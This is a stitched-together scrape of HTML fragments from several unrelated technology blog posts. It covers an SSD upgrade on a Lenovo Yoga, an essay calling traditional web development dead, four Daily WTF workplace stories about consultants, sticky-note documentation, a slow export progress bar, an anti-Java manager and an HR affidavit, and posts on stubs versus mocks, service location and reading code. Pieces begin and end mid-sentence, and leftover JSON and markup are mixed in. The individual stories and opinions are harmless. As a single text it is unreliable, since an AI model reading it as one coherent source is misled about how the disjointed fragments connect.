I was able to twist the frame a bit to install the new SSD.  Just like RAM, you insert it at a slight angle and make sure it is fully seated.  My mSATA drive came with two screws.  I only had to use one of them to keep it down.</p><h2>Performance</h2><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_2.png\"><img title=\"image\" style=\"border-top: 0px;

(desktop/laptop computers – PCs/Macs)</p><p>I started web development in 1997 using Microsoft’s<a href=\"http://msdn.microsoft.com/en-us/library/ms525756(v=vs.90).aspx\">IDC/HTX</a>technology that ran on IIS on Windows NT 4.  Soon thereafter, Microsoft developed Active Server Pages (ASP), then .Net, then MVC, now Web API, and is now working on<a href=\"http://www.typescriptlang.org/\">TypeScript</a>as a way for C# programmers to develop JavaScript for HTML5 applications using classes, namespaces, and some typing help (see my<a href=\"https://github.com/jeffreypalermo/FizzBuzz-TypeScript\">TypeScript FizzBuzz example</a>)</p><p><img style=\"float: left;

display: inline\" align=\"right\" src=\"http://harbor-pc.com/shop/images/black_17_inch_monitor.jpg\" width=\"141\" height=\"122\" />Over the last decade, web applications for business have dominated.  This was a big new capability: run the software without installing it.  We can’t discount this.  It was huge.  The computing form factor, however, was unchanged.  It was the desktop.  In 2000, you were lucky if you had a 17 inch CRT monitor.  By 2003, 19 inch was becoming more popular, so early web applications were build with 1024x768 target resolution. </p><p><a href=\"https://o.twimg.com/1/proxy.jpg?t=FQQVBBgpaHR0cHM6Ly90d2l0cGljLmNvbS9zaG93L2xhcmdlL2MwZjZ6dy5qcGcUBBYAEgA&s=TXyyMJ1hag6VbKR6hnSYSP_EdqbTjAPSxZ5RznpGxu8\"><img style=\"border-top: 0px;

margin: 0px 0px 0px 5px; display: inline\" align=\"right\" src=\"https://lh3.googleusercontent.com/-hh04Ff7Jn7s/UQLADa2bhgI/AAAAAAAAA34/09mPisyNocs/w497-h373/317047_467084600007090_1848203976_n.jpg\" width=\"185\" height=\"127\" />Web development, as we know it, is dead.  It had a great run.  Applications were greatly simplified with only 2 tiers to manage: the application, and the database.  We “told” ourselves that we were still 3-tier because the browser was the 3rd tier, but we had little control over that. </p><p>The new world and the new face of web development for the business world of custom software is one where the application runs on the web server and is merely a set of APIs.  No presentation.  Talk about forcing separation of concerns (SoC).  This new world is one where we must recognize that the shape of computers has radically shifted and that clients are, once again, fragmented.  We will not be able to write one client application to serve all people or all platforms.  The new web applications of this decade run headless on the web server and merely interact with multiple clients.  We will be on the hook for developing as many of these clients as we determine is necessary to serve the business need.  And these different computing form factors will likely be differently designed.</p><p>For instance, an HTML5 client is likely going to be common for many scenarios including seldom-used features like maintenance screens (it’s really easy to do these here).  On the other hand, for people on the go, they will need to perform some functions from wherever over a 3G/LTE connection.  For this, the business needs to select iOS/Android/WP8 for the target platform.  This mobile app with then just talk to the application running on the server.</p><p><img style=\"float: left;

I’m already a‘you guy?’”</p><p>Bob laughed disarmingly.“We built the network it’s installed on. It makes total sense.”</p><p>“You’re not running up against our non-compete?” Peter asked.</p><p>“No, man. We’re‘consultants’ now- totally different gig.” Bob turned back to add in a whisper,“and making<i>twice</i>the money! Lunch is on an expense account, by the way. Want to come to the steakhouse with us?”</p><p>Peter couldn’t fault Bob, especially not in the age when most employers discarded entire divisions like empty bottles of Evian. Still, in a way Peter felt like<i>he</i>was being left to sink or swim, not the company.</p><p>“Who came up with this idea?” he couldn’t help asking.“You or them?”</p><p>Bob sighed and looked down at Peter, in more senses than one.“Look, it’s not important. Hang in there, man. Maybe one of these days, you’ll get to do the same thing.”</p><p>Instead of developing in-house— too expensive— Peter’s company had contracted ConsultPro to implement a SharePoint core to unify dozens of their business applications. The project had lasted over a year, long enough for facades to melt away. The “strategic partnership” morphed from a collaboration of equals to a nimble parasite feeding off a dim- and slow-witted host. Not only was ConsultPro raking in monstrous hourly fees for its “specialized expertise,” it was also poaching three of the company’s engineers.</p><p>Peter wasn’t bitter. His chief responsibility lay in network account administration, so it wasn’t surprising that ConsultPro hadn’t come at him with the magical Wand of Consultant. However, there would be lots of knowledge transfer and shared responsibility until replacements arrived, cutting into all the work the department already had to do. Peter was also backup support for ConsultPro’s new solution, and had to familiarize himself with its underpinnings. He read up on documentation, played in the test environment, and handled the smaller tasks that primary support didn’t have time for. Meanwhile, Bob and his cohorts ascended to the land where money hemorrhaged upon those who dressed the most basic observations in the fanciest terms amid the swankest soirees.</p><p>The new system had some minor hiccups, as new systems do. It went live, and users acclimated. All went well for several months. Management toasted themselves for hiring outside help and reducing the Engineering budget, freeing up company resources to better focus on core strategies— like management bonuses. Perhaps the company didn’t need so many developers and support reps after all—</p><p>—and then, a major crash paralyzed everything. No one could log into the SharePoint portal. Thousands of users lost access to the apps they needed to do business. Peter’s CEO placed a frantic call to ConsultPro. Within an hour, Bob and the other two poached engineers returned to their former workplace and secreted themselves away in the biggest conference room on Peter’s floor.</p><p>Peter wasn’t primarily responsible, but decided to drop in on Bob and his old coworkers.“Hey! How’s it going?”</p><p>“Hi.” None of them managed more than that. A tension normally reserved for bomb disarmament choked the air out of the room.</p><p>“Um…” Peter grasped for something to say.“Anything I can help with?”</p><p>Bob ran a hand over his thinning hair, sighing and muttering.“It’s been two hours and we haven’t figured this out. You better clear out of here. It’s really complex, we’d probably bore you.”</p><p>Peter peered over Bob’s shoulder, at the error message on his laptop.“It could be that the security log’s full. Have you checked the application’s internal registry?”</p><p>The consultants in the room glanced up with a shot, questioning looks on their faces.</p><p>Peter walked Bob to the proper registry key.“This should be a 1, not a 4. It does that when the security log is full and has failed to be cleared and saved properly. Run the script<code>save-and-empty-seclog</code>, that should take care of it.”</p><p>Stunned, Bob nevertheless complied. Within minutes, everything was up and running again.</p><p>“How did you know that?” one of the other consultants asked, astonished.</p><p>“It’s in the documentation,” Peter said.“The same documentation<i>you</i>released to<i>us</i>. So this is why you get twice the pay I get?”</p><p>Peter shrugged, and left before any of them replied.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

When the owner, an old man named Brad, had offered her a position after spotting her in a student computer lab, she thought he was crazy, but a background check confirmed everything he said. Now she wondered if her first intuition was correct.</p><p>“Anita, welcome!” Brad seemed to bounce like a toddler as he showed Anita inside. The walls of the converted garage were bare drywall; the wall-mounted AC unit rattled and spat in the corner. In three corners of the office sat discount computer desks. Walls partitioned off Brad’s office in the fourth corner.</p><p>He practically shoved Anita into an unoccupied desk. The computer seemed to be running an unlicensed version of Windows 8, with no Office applications of any kind. “Ross can fill you in!” He left the office, slamming the door shut behind him.</p><p>“Hi.” Ross rolled in his chair from his desk to Anita’s. “Brad’s a little enthusiastic sometimes.”</p><p>“I noticed. Uh, he never told me what game we’re working on, or what platform. Not even a title.”</p><p>Ross’s voice lowered to a whisper. “None of us know, either. We’ve been coding in Unity for now. He hired you as a programmer, right? Well, right now we just need someone to manage our documentation. I suggest you prepare yourself.”</p><p>Ross led Anita into Brad’s office. Above a cluttered desk hung a sagging whiteboard. Every square inch was covered by one, sometimes several, overlapping sticky notes. Each had a word or two written in Brad’s scrawl.</p><p>“We need more than just random post-its with ‘big guns!’ and ‘more action!’” Ross said. “We don’t even know what the title is! We’re going crazy without some kind of direction.”</p><p>Anita stared at the wall of sticky notes, feeling her sanity slipping from her mind like a wet noodle. “I’ll try.”</p><h3>Sticky Escalation</h3><blockquote><pre>Brad, can we switch to Word for our documentation? It’s getting harderto read your handwriting, and there’s a lot of post-its that havenothing to do with the game. This will make it easier to proceed withdevelopment. -Anita</pre></blockquote><p>Two minutes after she sent the email, Brad barged out of his office. “Anita, why spend thousands of dollars on software licenses when this works just fine? If you can’t do your job with the tools you have, what kind of a programmer does that make you?”</p><p>“Brad, this isn’t going to work forever. Your whiteboard is almost out of room, and you won’t take down any of your non-game stickies!”</p><p>“I can’t take any of them down, Anita! Any of them!” He slammed the door to his office behind him.</p><p>The next day, Anita was greeted at the door by the enthusiastic Brad she had met before the interview. “I listened to reason, Anita. I hope this is enough for you to finish this documentation and get coding again!”</p><p>Brad led Anita into his office. On every wall surface, over the door, even covering part of the floor, were whiteboards. Sticky notes dotted nearly a third of the new whiteboard space.</p><p>“Now, Anita, if I don’t see new code from you soon, I may just have to let you go! Now get to work!”</p><p>Anita went to sit at her desk, then stopped. Instead, she grabbed a bright red sticky note, wrote the words “I QUIT” with a sharpy, barged into Brad’s office, and stuck it to his monitor. Brad was too stunned to talk as she left the converted garage.</p><h3>The Avalanche</h3><p>“Are you doing better?” Jason called Anita a few weeks later. Their short time together at GES has made them comrades-in-arms, and networking was crucial in the business.</p><p>“Much,” she said. “I got a real job with an indie developer in Santa Monica. We even have a wiki for our framework!”</p><p>“Well, listen to this. The day after you quit, the AC unit in the garage broke. I came into work to see Brad crying in a corner in his office. All of the sticky notes had curled in the humidity and fallen to the floor. The day after he got us all copies of Word.</p><p>“Too bad we still don’t know what the title of the game is.”</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

He had been an annual visitor to Comicon for the past decade, but when they ran into trouble with the audio right before the \"Big Bang Theory\" cast panel, he just happened to be the right person in the right place at the right time. Working furiously to get the cabling back together, he was surprised the gentle tap on his shoulder. Turning around, he found himself face-to-face with Kaley Cuoco.</p><p>\"Thanks soooo much for your help\", she cooed.</p><p>\"N-N-No problem\", Eric stuttered. \"Happy to be able to help out\"</p><p>Turning back to the console, Eric refocused. Was that a hand he still felt resting lightly on his back?</p><p>And that faint music. Getting lounder. It was almost...no, it<strong>was</strong>the sound of the Barenaked Ladiea.</p><p>Groggily, Eric rolled over in his bed and reached for the cell phone that was ringing on the night stand.</p><p>\"Yeah?\"</p><p>\"Eric, it's Trevor. We've been running into a problem since that patch to the exporting program was put in over the weekend. It has been slowly getting worse over the weekend, but now that Europe is starting to come on-line, it's become an emergency.\"</p><p>An emergency, thought Eric? Yeah, sure. Then why wasn't it an emergency yesterday evening.</p><p>Still Eric went over to his desk, flipped on his computer and started digging. Naturally, the first place to look was where stuff had just been changed.</p><p>When not saving geek conferences, Eric worked for a phone company that keeps custom audio from their customers in giant wave files. And for him, 'giant' meant around 200-700MB. These wave files contained custom prompts created by their customers in an audio format. Associated with each of these wave files is a text file containing metadata about the number and content of the prompts encoded in the audio format.</p><p>When a wave file was imported into the application, it would break the wave file into a large number of 20MB chunks. These chunks were easier to manage (not to mention being able to ZIP up and send around by email, if needed). The file names related to these chunks were included in the text-based metadata. On export, the metadata file would be read, the chunks located and put back together into one big file.</p><p>However, thanks to a change in the export process, the 'de-chunkifying' was taking much longer than before. When one told the program to export, it would hang for about eight seconds, and then pop up a progress bar and chug away for about four more seconds. And the only change seemed to be the addition of that progress bar. Putting aside the WTF-ness of waiting two-thirds of the way into a process to even start the progress bar, the timing seemed odd to Eric.</p><p>Seeing no other significant modifications, Eric drilled into the code surrounding the progress bar. The import was split into three steps.  First it loads the audio metadata from the text file. Next it uses a function to check the total sizes of the audio 'chunks' (to more accurately inform the user of the progress). Finally, the progress bar was displayed and the exported file created.  Thinking it was strange that the first two parts took 8 seconds while the real work took only four, Eric went further into the code.</p><p>What he saw was that the time before the progress bar was spent almost entirely in the function checking the file sizes. Now knowing where to look, Eric quickly scanned through the file sizing code. As it turns out, rather than measuring the file size, it was measuring the audio size. Which required it to open, read, and process the header of each and every 20MB wave file.</p><p>Given the criticalness of the accuracy of the progress bar (yes, he was familiar with how precise Microsoft always got with their progress indicators), Eric altered the progress bar procedure to use the number of chunks in the text file rather than the combined size of the audio chunks as it's metric. All of a sudden, the progress bar was almost instantaneously available and the entire exporting process took 4 seconds. Looking a little further into the code, he discovered that the updates to the progress bar were being made with ever 200B read from the file. By increasing that to 4MB he cut another 3 seconds off the process. Yes, yes the cost was less accuracy. Sue him.</p><p>Eric pushed the changes into the master branch and relaxed back into his chair while waiting for the build to run.</p><p>\"Oh Eric,\", said Kaley as she leaned closer, \"you're soooo awesome.\" The kiss was soft and moist.</p><p>The ping of an incoming notification brought Eric back to consciousness. And the only blonde in sight was the cocker spaniel licking drool off of his face.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

They both shared in the support and maintenance of a monstrous in-house spawned order processing / network monitoring / invoice printing / slashy / slash / slash system written in Visual C++. However, while Pete kept up in the latest technology trends and was always on the lookout for new solutions to old problems, Dick was a very conservative manager with twenty-five company years under his belt. To Dick,\"change\" was only a Good Thing when it added up to 65¢, which was the exact amount required to buy a ginger ale from the soda machine. What kept Pete and Dick from being a perfect couple was that Dick was Pete's supervisor and often times, he got his way.</p><p style=\"margin-top: 0px\">Back in the late-90's, Pete had caught wind of some\"Java\" thing starting to pick up steam. When comparing features, he found that many of the kludgy, half-hearted attempts at a supportable solution they developed would have been scads easier to do using Java. Intrigued at the prospect of a better codebase that took less to develop, Pete coded up a new modules in Java as a proof of concept. For a prototype, it seemed to work well. That is, until it hit a roadblock named Dick. You see, Dick had heard about Java, too.</p><p>\"You're a developer, not a hacker,\" Dick ranted after being shown the Java prototype,\"we already have the right tools for the job at our hands. Anything that must be run as bytecode through a<em>virtual</em>machine will always be ten times slower!\"</p><h3 style=\"margin-bottom: 0px\">Order Jamming</h3><p style=\"margin-top: 0px\">As the years past by, Dick continued to have misgivings about Java. Whenever someone said the word\"Java\", his knee-jerk reaction was<em>*cough*virtualmachine*cough*</em>. As developers from other teams began using Java tools for themselves, he'd shake his head, roll his eyes back, and eagerly await the first opportunity to say\"told you so\" if anything unexpected occurred. Even something as little as a typo.</p><p style=\"margin-top: 0px\">Not all Java encounters, however, ended with just an eyeroll. One day, after being impacted by a\"major Java failure\" in another department's application, Dick dished out some full-fledged, beat-in-the-face, you'll-be-lucky-if-you-have-a-job-in-the-mailroom-once-I'm-through-with-you anger to one of the lead developer in the other group. And for good reason: the application in question was a J2EE-based order processing system that used Oracle databases and Enterprise Java Beans. That fell directly into the crosshairs of Dick's anti-Java artillery.</p><p style=\"margin-top: 0px\">Curious as to the technical details of the failure, Pete inquired with the developer. The problem, as he explained, occurred in the middle of a seasonal heavy volume period where the number of orders per second peaked into the hundreds. During that time, it took several minutes to complete a transaction, making the performance comparable to that of a crusty old 486. Dick had of predictably blamed Java.</p><p style=\"margin-top: 0px\">\"Had it always buckled under the pressure?\" Pete asked.</p><p style=\"margin-top: 0px\">\"No,\" replied the colleague,\"we're on Version 3 of the system; it's not like they had gained thousands of customers overnight.\"</p><p style=\"margin-top: 0px\">\"So what happened recently to make things so bad?\" asked Pete.</p><p style=\"margin-top: 0px\">\"Dick happened.\"</p><p style=\"margin-top: 0px\">Previously, the system had used a message queue system to pass data between it and the big server in the Financials group. However, now, every single transaction was saved off to a custom table in the database, dumped to a common directory on Unix, and then were transferred out by a cron job via FTP. Pete asked why on earth they were writing the transactions to text files.</p><p style=\"margin-top: 0px\">\"That's most likely what's slowing the whole thing down so much,\" the developer explained.\"Dick insisted that, if we were to interface with your system, then we'd have to write everything to text files for reliability. He likes to have the data around where he can see it. To the best that we can tell, he just didn't trust the whole Java and database thing.\"</p><p style=\"margin-top: 0px\">Though\"Javagate\" didn't have the outcome that Dick had hoped— having the mature order processing system be scrapped in favor of something a little lower in the alphabet than\"J\"— he still remained bitter about technology.</p><h3 style=\"margin-bottom: 0px\">A Sure Thing!</h3><p style=\"margin-top: 0px\">Because of ACME's expertise in building specialized logistical software, a Norwegian company named FooNorsk sent some suit n' tie guys to probe ACME for a really big thing: they had just won a government contract to automate the transportation of passengers around the whole country and wanted ACME to develop some parts of the system.</p><p>The system would be responsible for tracking all the vehicles (trains, buses and boats) using GPS, automatically planning all the schedules, coordinating different transportation systems, solving problems due to service interruptions, delays, etc. It was slated to be installed in a big server farm near Oslo and require hundreds of servers to run. Oh, and it was to be based in J2EE.</p><p style=\"margin-top: 0px\">Pete and Dick attended some meetings with the tall, Viking-looking guys. In a break for coffee, Pete was talking with FooNorsk's main engineer about how ACME had done plenty of Java based projects and had so much expertise in the subject.</p><p style=\"margin-top: 0px\">When the meeting resumed, the discussion went about some more technical details. Dick then sealed the fate of the meeting with these killer sentences:</p><p style=\"margin-top: 0px\">\"So, your system is made in Java? We don't use any Java around here, it's just too slow. It has no use in our line of business. Why don't you use C++ instead?\"</p><p style=\"margin-top: 0px\">Needless to say, the contract was lost in that precise moment.</p><h3> </h3><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

When a family member's health began to fail, they were able to sell their software business and retire to help him manage. In their forties, their good fortune and low-key lifestyle meant they wouldn't have to return to work unless they wanted to.</p><p>After a couple of years, things had settled into a routine and Dave was ready to consider new opportunities. A local startup was courting him for a senior position, and their engineering team, relatively young and untested, seemed excited to have a steady hand at the tiller. But this startup was unusual: no hiring decision could be made on nautical metaphors alone. They - specifically, their overlords at WTF Ventures, Inc. - prided themselves on fusing the discipline and professionalism of the corporate world to the innovation and foosball-playing of startup culture.</p><p>That fusion is what put Dave across a boardroom table from Regina, the Head of HR, explaining why he had no \"Education\" section on his résumé.</p><p>\"I went to college briefly in the late 'eighties,\" Dave said, \"but dropped out with my business partner to start our first consulting company.\" Regina raised her eyebrows, so Dave continued. \"I suppose I left<em>some college</em>off my résumé to make room for the subsequent twenty-five years of experience...\"</p><p>\"Hmm. But don't you feel unfulfilled?\" Regina said.</p><p>\"Unfulfilled?\" Dave blinked. \"Well...  no. Fortunate, lucky,<em>free</em>.\" He counted the adjectives off on his fingers. \"I feel a lot of things, but not unfulfilled.\"</p><p>Regina raised her eyebrows again, so, once more, Dave elaborated. \"I'm forty-five, and you're trying to lure me out of<em>retirement</em>to run engineering at a startup. I feel pretty fulfilled.\"</p><p>\"Oh,\" Regina said. \"We'll need an affidavit of education.\"</p><p>\"A<em>what?</em>\" Dave had to compose himself. \"Pardon me. I'm not claiming to<em>have</em>any education. I'm sorry, I don't quite understand what you'd need an affidavit for...?\"</p><p>\"We're seeing a lot of fraud around claimed but unearned academic credentials,\" Regina said. Now it was Dave's turn to silently prompt her to continue. \"You know: people with a Bachelor's claiming to be doctoral graduates. We need to see an affidavit.\"</p><p>Dave toyed with what it would take to get his<em>almost-mater</em>to certify that he had, in fact, attended two full years of undergraduate Computer Engineering. He couldn't even remember if he'd started in the 1986-87 academic year or what his cumulative GPA had been.</p><p>Regina took his silence as an opportunity to lean forward and add, \"The affidavit<em>must</em>be notarized, of course.\"</p><p>\"This all seems a little backwards,\" Dave said. Regina raised her- you get the idea. \"I'm not sure what you want an affidavit from me to substantiate: that I don't secretly have an advanced degree in nuclear engineering? That I'm not lying to you now to cover up my possession of a tenured professorship?\"</p><p>\"Sorry, but that's our policy. We don't want to take a chance on<em>anyone</em>claiming educational accolades they never<em>actually</em>received.\" Regina passed his résumé - tagged<em>EDUCATION???</em>in bold red marker at the bottom â€” back across the table. \"You'll need a<em>notarized</em>affidavit stating your true level of education.\"</p><p>Dave opted to withdraw his application instead. After careful consideration, he determined that the life of an early-retiree was more commensurate with his academic achievements.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>.

However, I get the feeling thathe, like many folks, approaches testing as a method for verifying thecorrectness of code.

I believe testing is a tool to be used in guiding your design.</span></p><!-- more --><h3>An example</h3><p>I realize that it’s unfair to pick on sample code used in talks, but<em>“Problem2: Stubbing instead of mocking”</em>provides a great illustration. Here the authorclaims that we too often stub where we should be mocking. He gives thefollowing snippet:</p><p><img class=\"right\" src=\"http://stevenharman.net/images/posts/sensible-testing-code.png\" title=\"\"Problem 2: Stubbing instead of mocking\"\" alt=\"\"Problem 2: Stubbing instead of mocking\"\"></p><p>Firstly I had to get over the use of the old RSpec 1.0-style<code>#stub!</code>and theoverly verbose<code>#and_return</code>syntax. After resetting my brain I quicklyrealized the test was awkward. I re-read it a few times and then asked,“whystub, or mock for that matter, methods on the object under test?”</p><h3>A design issue emerges</h3><p>This is a design issue! The<code>BalanceCalculator</code>is doing too much work. This isthe“S” in SOLID - the Single Responsibility Principle. The friction of thistest suggests that we need to adjust the design.</p><p>For example, we could wrap the<em>account info</em>and<em>account type</em>into a cohesiveobject to be passed into the calculator.</p><h3>To stub or to mock?</h3><p>Forgiving that design issue for now, let’s get back to the author’s point -<em>should we mock or stub those methods?</em></p><p>The methods in question are queries. The<code>BalanceCalculator</code>presumably usesthe results of those queries to do its work. So why do we need to set anexpectation that we should call those methods? Afterall, if we don’t call themwe’ll not have their resulting values, so we won’t be able to do the work, sothe test<strong>should</strong>fail. Right?</p><p>And if we don’t call those methods and the test passes, then they neither needto be mocked nor stubbed as they are unnecessary.</p><p>So, to stub or mock… how do we know when to use which?</p><p>My heuristic is that stubs are for queries and mocks are for commands.

Before any one rips off on a rant let me say that I worked with<a title=\"JonKruger.com\" href=\"http://www.jonkruger.com/\" rel=\"friend met co-worker\">Jon</a>in my former life and I’m fairly certain he’s merely conducting a thought experiment, trying to sure up his own beliefs.

I can call `ObjectFactory.GetInstance()` anytime I want and it will work.  And I could leave SM configured for my tests and call `ObjectFactory.Inject()` to stub things out.</p><p>So theoretically, I wouldn’t even need constructor injection, right?</p><footer><strong>Jon Kruger</strong><cite><a href='http://groups.google.com/group/structuremap-users/browse_thread/thread/2ee1a7eab03d7f2a'>StructureMap ML_</a></cite></footer></blockquote><h3>Let’s get the jargon down</h3><p>To be clear, Jon proposing using<a href=\"http://martinfowler.com/articles/injection.html#UsingAServiceLocator\" title=\"Using a Service Locator\">Service Location</a>rather than<a href=\"http://en.wikipedia.org/wiki/Dependency_injection\" title=\"Dependency Injection\">Dependency Injection</a>.</p><p>While Service location is better than<a href=\"http://www.lostechies.com/blogs/jimmy_bogard/archive/2009/07/03/how-not-to-do-dependency-injection-in-nerddinner.aspx\">poor-man’s DI</a>, using it as suggested above is still introducing a high degree of coupling as all of these classes now have an opaque and highly concrete dependency on the container. This is effectively creating a new form of<code>Global</code>.<em>Eww!</em></p><p>The key to using Service Location within<strong>new code</strong>is to keep it tucked away in the deepest, darkest corners of your infrastructure. For example, if you’re building something on the asp.net mvc stack, you might use Service Location within a custom<code>IControllerFactory</code>to create each of your controllers.</p><p>If you’re dealing with<strong>legacy code</strong>, full of concrete dependencies, you might use Service Location as technique for teasing things apart with a goal of decreased hard coupling. In the end this may result in wholesale replacement of some modules.</p><p>When it comes to Dependency Injection and dependencies in general, I agree with<a href=\"http://blog.scottbellware.com/\" rel=\"friend met\">Scott Bellware’s</a>point of view; make your<a href=\"http://codebetter.com/blogs/scott.bellware/archive/2007/06/28/164867.aspx\" title=\"Dependency Patterns: Optional Dependencies and Primal Dependencies\">dependencies explicit& transparent</a>by requiring them in the constructor. My gut reaction is also to avoid translucent (setter-injected) dependencies as they make it harder to tell what dependencies an object will need to do its job - the shape of the object isn’t as clear as with explicit constructor dependencies.</p><h3>Feeling the friction</h3><p>I tend to be lazy and prefer to feel friction of poor design early so I can change direction quickly. For example, when a constructor gets too large it’s a signal to stop and consider<a href=\"http://butunclebob.com/ArticleS.UncleBob.PrinciplesOfOod\" title=\"Uncle Bob's Principles of Object Oriented Design\">Single Responsibility Principle, Separation of Concerns, etc</a>. In a similar vein, I don’t usually advocate use of an<a href=\"http://www.lostechies.com/blogs/joshuaflanagan/archive/2009/02/03/auto-mocking-explained.aspx\" title=\"Auto-mocking Explained\">auto-mocking container</a>. Or at least not for folks who’ve not yet acquired a strong nose for design and simplicity; the friction helps keep you on the rails.</p><p>Later in the tread Jon mentions some friction he’s been feeling when setting up the<a href=\"http://stevenharman.net/blog/archive/2009/05/27/toward-a-better-use-of-context-specification.aspx\" title=\"Toward a Better Use of Context/Specification\">context</a>of his tests (or specs). Namely he’s having to set up and inject a lot of concrete objects for interaction within his unit tests. To me this is an indication that those tests may actually be integration tests. After all, they are flexing the integration of a several modules in concert, right?</p><p>I say, call them what they are, fire up the fully configured container, and move on.</p><p>I prefer to make the implicit explicit, to be able easily see the shape of an object, and in getting forced feedback when my design starts to slip off the rails.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=x8rG8r0ITLc:j4lXx8Uz_7s:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=x8rG8r0ITLc:j4lXx8Uz_7s:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=x8rG8r0ITLc:j4lXx8Uz_7s:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/x8rG8r0ITLc\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":925}}

Aspecification is an observation about the interactions that occurred or thestate of the system after some behavior has been exercised.</p><h3>Make it explicit!</h3><p>We want small, focused contexts, yes?

The corollary is, of course, that you likely don’t have smallcontexts. That is trouble and is often an indicator that the one, largecontext is itching to be split out into two or more discrete contexts.</p><p>Upon switching your base class over to this more rigidContext/Specification pattern, you might also find that you have some –or many – broken specs. This is an indicator that those broken specswere not side effect free. Well, actually its suggesting that some ofthe sibling specs weren’t side effect free and they are now causingother specs to break.</p><h3>Notes:</h3><p>The portions of this article relating to changing from a standardcontext set up to a once-per-fixture style apply to<em>most</em>of thehand-rolled Context/Specification base classes I’ve seen in the wild.</p><p>If, however, you are using a tool like<a href=\"http://github.com/machine/machine.specifications\">MSpec</a>, then you’re in goodshape as<a href=\"http://aaron-jensen.com\">Aaron</a>applied this same philosophy out of the gate.

It is not deterministic. There is no grand blue print, process, nor methodology that we can follow to pay dirt.</p><p>We live in a chaotic and complex world that is itself continuously changing and adapting.</p><p>Software product development is a creative activity taking place in the midst of that complex and adaptive world.

One thing I’ve realized is that those folks spend an immense amount of time studying and seeking inspiration from the work of others both within and outside their own field.</p><p>For example, a musician doesn’t just sit in his garage all day, banging out albums. He listens to and is influenced by the music of many other musicians. An author doesn’t simply site down and write manuscript after manuscript. She spends countless hours reading the classics, studying the words, flow, and style of other authors. The same thing goes for painters, actors, architects, etc. And all of these people are constantly immersing them selves in works outside their area; musicians reading Hemingway, singer/song writers studying Salvador Dali, painters listening to Mozart, cats and dogs living together…</p><p>How arrogant of we programmers then to think that we won’t, or don’t, benefit from reading code written by -<em>gasp</em>- someone else!</p><h3>Read, learn, and be inspired</h3><p><img class=\"right\" src=\"http://stevenharman.net/images/posts/text.jpg\" title=\"Yay for reading!\">In my experience we spend a great deal more time reading code than actually<em>writing</em>it. Whether it be the code you wrote just a few minutes ago or something you’ve inherited and are now maintaining, you’re reading it. Of course, that’s only considering the motive of reading code because you’re currently working with.</p><p>The greatest motivator for reading code is the opportunity it provides for learning and serving as a source of inspiration. Reading code exposes you to techniques, view points, styles, idioms, and algorithms that you may not have otherwise come across.</p><p>In my own career it was by reading code written in Ruby that I first started to develop an appreciation for beauty and aesthetics in code. It also opened me to new ways of thinking about problems and exposed many pains and frictions with the techniques I had been using to that point.</p><h3>Where to start?</h3><p>I realize it’s probably obvious, but I’m going to say it anyhow - a great way to start reading other’s code is to pull down an Open Source project and dive in. Of course, that’s not to say that all Open Source code bases are necessarily examples of great code’ so you might also want to leverage your network to find examples.

